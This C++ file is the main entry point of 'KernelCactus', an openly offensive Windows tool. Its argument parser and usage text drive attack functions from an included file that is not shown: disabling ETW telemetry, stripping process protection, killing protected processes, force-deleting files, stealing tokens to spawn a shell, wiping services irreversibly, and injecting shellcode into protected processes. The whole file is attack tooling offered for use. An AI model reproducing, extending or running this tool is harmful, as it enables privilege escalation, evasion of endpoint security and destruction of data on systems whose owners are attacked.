#include <aclapi.h>
#include <stdio.h>
#define _AMD64_
#include <vector>
#include "Attacks.cpp"
#include <shlwapi.h>

bool IsProcessRunning1(int ProcessId)
{
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry))
			if (entry.th32ProcessID== ProcessId)
				exists = true;

	CloseHandle(snapshot);
	return exists;
}
std::string GetOs() 
{
	static const char path[] = "ProductName";                                     
	char buffer1[1024];
	DWORD buffsz1 = sizeof(buffer1);
	{
		HKEY key;
		//nested if - no key no game 
		bool b = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_QUERY_VALUE, std::addressof(key)) == 0;
		bool a = RegQueryValueExA(key, path, nullptr, nullptr,(LPBYTE) buffer1, std::addressof(buffsz1)) == 0;
		if (a && b)
		{
			return buffer1;
		}
		else
		{
			return NULL;
		}
	}
}

std::string banner =
R"(
      ___  __        ___          __        __  ___       __  
|__/ |__  |__) |\ | |__  |       /  `  /\  /  `  |  |  | /__` 
|  \ |___ |  \ | \| |___ |___    \__, /~~\ \__,  |  \__/ .__/                                                  
      .-.    
      |.|	  ITS POINTY AND IT HURTS!
    /)|`|(\          https://spikysabra.gitbook.io/kernelcactus/
   (.(|'|)`)\_(o_O)_/				
~~~~`\`'./'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      |.|  Email:   spikysabra@gmail.com
      |`|  twitter: @SpkiySabra
     ,|'|. Github:  www.github.com/SpikySabra
      "'"        
 Made by: Itamar Medyoni && Matan Haim Guez
)";


//--hide PID / current						Hide a process from the process list in the kernel
//(some houdini magic, mostly good for anti - forensic / masquerading EDR might still kill you if you are detected)
std::string usagetext =
R"(
--help								Display usage 

--etw 0/1							Disable/Enable ETW

--ppl PID 0/1							Disable/Enable PPL from any process 

--terminate	PID						Terminate single Process:
								this is aimed mostly for protected processes. 
								but will work for any process that provieds you with PROCESS_QUERY_LIMITED_INFORMATION in its ACL.
							        (in case you do not hold such right, you are more then welcome to use '--token PID current --terminate PID in order to recive one :D )

--delete PATH							Delete any file that provides you with ANY handle access ;)


--token srcPID dstPID						copy a token via kernel from one process to another. works both on local AND domain purposes ;)
								(use 'current' on dstPID in order to change the current process token)

--tokenspawn PID						spawn a new CMD shell with the chosen process token.						

--destroyservice path\to\pids.txt path\to\files.txt		WARNING, USE WITH RESPONSIBILLITY!
								ALL FILES DELETED ARE NOT RESTORABLE, MAKE A COPY PRIOR TO DELETING IF YOU NEED TO...
								Will kill all processes in pid list (line seperated) 
								Will delete all Files in the File list (line seperated)
								this module is aimed for services that own a WatchDog service. 
								deleting and killing all files is only in case that the lowest handle access
								is available to you by ACL, so again feel free to use --token to elevate privs. 

--tinject PID \path\to\shellcode				Perform RemoteThreadInjection to any process that provides you ANY handle , including protected processes 

--thijack PID \path\to\shellcode				Perform ThreadHijacking via kernel operations to any process that provides you ANY handle , including protected processes 
									
(shellcode must be in binary format )

)";


BOOL token;
int tokensrc;
int tokendst;

BOOL hide;
int pidtohide;

BOOL ppl;
int ppltotoggle;
BOOL pplvalue;

BOOL etw;
bool etwsitch;

enum Attacks {
	usage,
	terminateprocess,
	deletefile,
	thijack,
	tinject,
	destroyservice,
	tokenspawn
};
Attacks mode = usage;
int attackpid;
LPCWSTR filetodelete;
char* shellcodepath;
char* pidpath;
char* filepath;

char* pEnd;
int main(int argc, char* argv[])
{
	
	std::cout << banner << std::endl;
	auto OS = GetOs();
	if (OS.find("7") != std::string::npos || OS.find("2008") != std::string::npos) {
		std::cout << OS << " not supported yet, check back in soon :)" << '\n';
		exit(1);
	}
	bool disableetw= false;
	if ((OS.find("8") != std::string::npos && !(OS.find("2008") != std::string::npos))|| OS.find("2012") != std::string::npos) {
		std::cout << OS << " ETW TI Does not exist on this build." << '\n';
		disableetw = true;
	}
	AttackFlows AttackChooser = AttackFlows();
	if (argc < 2) {
		std::cout << usagetext << std::endl;
		exit(1);
	}
	for (int i = 1; i < argc; i++) 
	{	
		//move main to wmain - unicode - lose MultiToWide - compare strings as is 
		//var param = std::string(argv[i]);
		//use single convention - new line for curly brackets
		if (strcmp(argv[i], "--terminate")==0) {
			if (mode != usage) {
				std::cout << "ONLY ONE ATTACK MODE ALLOWED!!";
				exit(1);
			}
			mode = terminateprocess;
			i++;
			if (strtol(argv[i], &pEnd,10)>0L&&IsProcessRunning1(atoi(argv[i]))) attackpid = atoi(argv[i]);
			else {
				std::cout << argv[i] << " -this is not a PID...check usage";
				exit(1);
			}
			continue;
		}
		else if (strcmp(argv[i], "--delete")==0) {
			if (mode != usage) {
				std::cout << "ONLY ONE ATTACK MODE ALLOWED!!";
				exit(1);
			}
			mode = deletefile;
			i++;
			if (PathFileExistsA(argv[i])) {
				wchar_t* wString = new wchar_t[4096];
				MultiByteToWideChar(CP_ACP, 0, argv[i], -1, wString, 4096);
				filetodelete = wString;
			}
			else {
				std::cout << argv[i] << " -in delete - this is not a valid path...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--tinject")==0) {
			if (mode != usage) {
				std::cout << "ONLY ONE ATTACK MODE ALLOWED!!";
				exit(1);
			}
			mode = tinject;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L&& IsProcessRunning1(atoi(argv[i]))) attackpid = atoi(argv[i]);
			else {
				std::cout << argv[i] << " this is not a PID...check usage";
				exit(1);
			}
			i++;
			if (PathFileExistsA(argv[i])) shellcodepath = argv[i];
			else {
				std::cout << argv[i] << " -in tinject-this is not a valid path...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--thijack")==0) {
			if (mode != usage) {
				std::cout << "ONLY ONE ATTACK MODE ALLOWED!!";
				exit(1);
			}
			mode = thijack;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L&& IsProcessRunning1(atoi(argv[i]))) attackpid = atoi(argv[i]);
			else {
				std::cout << argv[i] << " this is not a PID...check usage";
				exit(1);
			}
			i++;
			if (PathFileExistsA(argv[i])) shellcodepath = argv[i];
			else {
				std::cout << argv[i] << " -in thijack-this is not a valid path...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--tokenspawn")==0) {
			if (mode != usage) {
				std::cout << "ONLY ONE ATTACK MODE ALLOWED!!";
				exit(1);
			}
			mode = tokenspawn;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L&&IsProcessRunning1(atoi(argv[i]))) attackpid = atoi(argv[i]);
			else {
				std::cout << argv[i] << " this is not a PID...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--destroyservice")==0) {
			if (mode != usage) {
				std::cout << "ONLY ONE ATTACK MODE ALLOWED!!";
				exit(1);
			}
			mode = destroyservice;
			i++;
			if (PathFileExistsA(argv[i])) pidpath = argv[i];
			else {
				std::cout << argv[i] << " -in destroy-this is not a valid path...check usage";
				exit(1);
			}
			i++;
			if (PathFileExistsA(argv[i])) filepath = argv[i];
			else {
				std::cout << argv[i] << " -in destroy2-this is not a valid path...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--etw")==0) {
			etw = TRUE;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L||atoi(argv[i])==0) {
				if (strtol(argv[i], &pEnd, 10)  == 1 ||(isdigit(argv[i][0]) && strtol(argv[i], &pEnd, 10) == 0))
					etwsitch = (BOOL)atoi(argv[i]);
				else {
					std::cout << argv[i] << " -this is not a valid option...check usage";
					exit(1);
				}
			}
			else {
				std::cout << argv[i] << " -this is not a valid option...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--ppl")==0) {
			ppl = TRUE;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L && IsProcessRunning1(atoi(argv[i]))) ppltotoggle = atoi(argv[i]);
			else {
				std::cout << argv[i] << " this is not a PID...check usage";
				exit(1);
			}
			i++;
			if ((isdigit(argv[i][0]) && strtol(argv[i], &pEnd, 10) == 0) || strtol(argv[i], &pEnd, 10) == 1) {
					pplvalue = (BOOL)atoi(argv[i]);
			}
			else {
				std::cout << argv[i] << " -this is not a valid option...check usage";
				exit(1);
			}
			continue;

		}
		else if (strcmp(argv[i], "--token")==0) {
			token = TRUE;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L && IsProcessRunning1(atoi(argv[i]))) tokensrc = atoi(argv[i]);
			else {
				std::cout << argv[i] << " this is not a PID...check usage";
				exit(1);
			}
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L && IsProcessRunning1(atoi(argv[i])) || strcmp(argv[i], "current")==0) {
				if (strtol(argv[i], &pEnd, 10) > 0L)	tokendst = atoi(argv[i]);
				if (strcmp(argv[i], "current")==0)	tokendst = GetCurrentProcessId();
			}
			else {
				std::cout << argv[i] << " this is not a PID...check usage";
				exit(1);
			}
			continue;

		}/*else if (strcmp(argv[i], "--hide")==0) {
			hide = true;
			i++;
			if (strtol(argv[i], &pEnd, 10) > 0L && IsProcessRunning1(atoi(argv[i])) || strcmp(argv[i], "current")==0) {
				if (strtol(argv[i], &pEnd, 10) > 0L)	pidtohide = atoi(argv[i]);
				if (strcmp(argv[i], "current")==0)	pidtohide = GetCurrentProcessId();
			}
			else {
				std::cout << argv[i] << " -this is not a PID...check usage";
				exit(1);
			}
			continue;

		}*/

	}
	if (token) 
		AttackChooser.StealTokenForExistingProcess(tokensrc, tokendst);
	//if (hide)
	//	AttackChooser.HideAProcess(pidtohide);
	if (ppl)
		AttackChooser.ToggleProcessProtection(ppltotoggle, pplvalue);
	if (etw&&disableetw==FALSE)
		AttackChooser.ToggleEtw(etwsitch);
	switch (mode)
	{
	case usage:
		if(!token&&!hide&&!ppl&&!etw)
			std::cout << usagetext << std::endl;
		exit(1);
		break;
	case terminateprocess:
		AttackChooser.TerminateProtectedProcess(attackpid);
		break;
	case deletefile:
		AttackChooser.DeleteProtectedFile(filetodelete);
		break;
	case thijack:
		AttackChooser.InjectProtectedProcessHijackThread(shellcodepath, attackpid);
		break;
	case tinject:
		AttackChooser.InjectProtectedProcessNewThread(shellcodepath, attackpid);
		break;
	case destroyservice:
		AttackChooser.DestroyPhoenixService(pidpath, filepath);
		break;
	case tokenspawn:
		AttackChooser.StealTokenForNewProcess(attackpid);
		break;
	default:
		break;
	}

}


